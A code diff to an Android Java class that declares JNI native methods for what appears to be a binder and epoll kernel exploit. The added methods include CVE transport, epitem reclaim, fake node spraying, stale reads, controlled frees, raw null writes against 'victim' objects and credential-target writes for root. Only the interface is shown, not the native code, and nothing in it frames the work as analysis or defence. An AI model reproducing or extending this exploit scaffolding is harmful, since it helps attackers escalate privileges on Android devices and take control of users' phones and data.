@@ -1,6 +1,7 @@
 package com.vandam.prism;
 
 import android.os.IBinder;
+import android.os.Parcel;
 
 final class NativeBridge {
     static final String SHELL_APK_PATH_PROPERTY =
@@ -57,6 +58,46 @@ final class NativeBridge {
 
     static native String bootstrap(long ownerPointer, long ownerCookie);
 
+    static native String inspectParcel(Parcel parcel);
+
+    static native String inspectRemoteBinderParcel(Parcel parcel);
+
+    static native String exportParcelTemplate(Parcel parcel, String path);
+
+    static native String prepareProbeShellCredential();
+
+    static native String rawBinderRouteProbe(Parcel serviceManagerParcel,
+                                              Parcel startServiceParcel,
+                                              long callbackPointer,
+                                              long callbackCookie,
+                                              boolean retainContext);
+
+    static native String releaseRawBinderRouteProbes();
+
+    static native String startRawBinderHolderRoutes(
+            String serviceTemplatePath, String startTemplatePath,
+            int expectedHolders, int indexSentinel);
+
+    static native String startRawVictimExports(String serviceTemplatePath,
+                                                String startTemplatePath,
+                                                int expectedVictims);
+
+    static native long[] collectRawVictimExports(int expectedVictims);
+
+    static native String queueAndRetireRawVictimContext(int victim);
+
+    static native String releaseRawVictimContexts(int expectedVictims);
+
+    static native String receiveRawBinderHolderRefs(int expectedHolders,
+                                                     int fixedRefsPerHolder,
+                                                     int expectedProof,
+                                                     int deathObjectIndex);
+
+    static native String releaseRawBinderHolderHandles(
+            int expectedHandles, int expectedDeaths);
+
+    static native String extendMixedSharedEpitemReclaim(int targetCount);
+
     static native String cveTransport(long ownerPointer, long ownerCookie);
 
     static native int pinCurrentThread(int cpu);
@@ -85,21 +126,39 @@ final class NativeBridge {
 
     static native String cacheOwnerHandleForDescriptor(String descriptor);
 
+    static native String cacheOwnerHandleForBinder(IBinder binder,
+                                                     String descriptor);
+
     static native boolean armEpitemLeakOwner(String directory);
+
+    static native int createRawTargetBoundarySignal();
+
+    static native boolean closeRawTargetBoundarySignal();
 
     static native boolean armRawTargetOwner(String directory, String nonce,
                                              String bootId,
                                              long targetStartTime,
-                                             boolean terminalCleanup);
+                                             boolean terminalCleanup,
+                                             int boundarySignalFd);
 
     static native String cleanupOwnerFragmentBuffers();
+
+    static native String runEpitemFragmentClient();
 
     static native String runEpitemLeakClient();
 
     static native String reclaimWithEpitems(String directory);
+    static native String prepareMixedEpitemReclaim(String directory);
+    static native String beginMixedEpitemReclaim();
+    static native String openMixedBinderWindow(int count);
+    static native String extendMixedEpitemReclaim(int targetPairCount);
+    static native String completeMixedEpitemReclaim();
+    static native String discardMixedEpitemReclaim();
     static native String analyseEpitemLeak(String directory);
 
     static native String decrementNodeBatch(String directory);
+    static native String decrementNodeBatchRange(
+            String directory, int start, int count, boolean notifyPredrain);
 
     static native String enableStaleRead(String directory);
 
@@ -133,6 +192,10 @@ final class NativeBridge {
                                                         int dispatched,
                                                         int timeoutMillis);
 
+    static native String proveRawBinderHoldersRetired(long generation,
+                                                       int contexts,
+                                                       int callbackDeaths);
+
     static native String acknowledgeControlledFree(long generation,
                                                      int victim);
 
@@ -159,7 +222,24 @@ final class NativeBridge {
                                               long pointer, long cookie,
                                               String directory);
 
+    static native String prepareRawNullWriteBatch(long[] pointers,
+                                                   long[] cookies,
+                                                   String directory);
+
+    static native String armRawNullWriteBatchVictim(int victim,
+                                                     long pointer,
+                                                     long cookie,
+                                                     String directory);
+
+    static native String retainRawNullWriteBatchVictim(int victim,
+                                                        int worker);
+
+    static native String retainRawNullWriteBatch(int[] workers);
+
     static native String validateRawWriteGate(long target, int victim);
+
+    static native String skipDirectRealCredWrites();
+
 
     static native long rootWriteTarget(int victim);
 
@@ -183,6 +263,8 @@ final class NativeBridge {
             int expectedAppPid);
 
     static native String cacheRawVictimNode(int victim);
+
+    static native String cacheRawVictimNodes();
 
     static native String cacheCredentialTarget(IBinder binder, int pid,
                                                  int uid, int gid);
@@ -237,6 +319,8 @@ final class NativeBridge {
 
     static native String ctlbufFinaliseStatus();
 
+    static native String ctlbufDonorResumeStatus();
+
     static native String acceptCtlbufFinaliseProof(String proof);
 
     static native String acceptTerminalNormalisationHostGate(String gate);
@@ -265,5 +349,18 @@ final class NativeBridge {
     static native String releaseReplacementDrain();
 
     static native String releaseFakeNodeSpray();
+
+    static native long armBinderDeathBarrier(IBinder binder);
+
+    static native String awaitBinderDeathBarrier(
+            long handle, int timeoutMilliseconds);
+
+    static native void discardBinderDeathBarrier(long handle);
+
+    static native long armProcessLifetimeGuard(int pid);
+
+    static native boolean isProcessLifetimeGuardAlive(long handle);
+
+    static native void discardProcessLifetimeGuard(long handle);
 
 }
